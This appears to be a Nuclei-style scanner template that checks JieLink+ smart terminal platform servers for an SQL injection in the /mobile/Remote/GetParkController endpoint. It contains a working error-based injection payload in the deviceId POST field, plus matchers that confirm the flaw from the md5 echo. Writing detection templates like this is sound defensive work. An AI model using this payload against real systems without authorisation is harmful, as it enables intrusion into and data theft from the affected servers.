id: poc-yaml-jielink-plus-getparkcontroller-sqli
info:
  name: JieLink+智能终端操作平台 GetParkController SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    JieLink+智能终端操作平台存在SQL注入漏洞，通过精心构造的POST请求，攻击者可利用该漏洞进行任意SQL查询。

variables:
  t1: "{{rand_int(1000,10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /mobile/Remote/GetParkController HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        deviceId=1'and/**/extractvalue(1,concat(char(126),md5({{t1}})))and'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "location.href"
          - "XPATH syntax error"
      - type: regex
        part: body
        regex:
          - "{{t2}}"
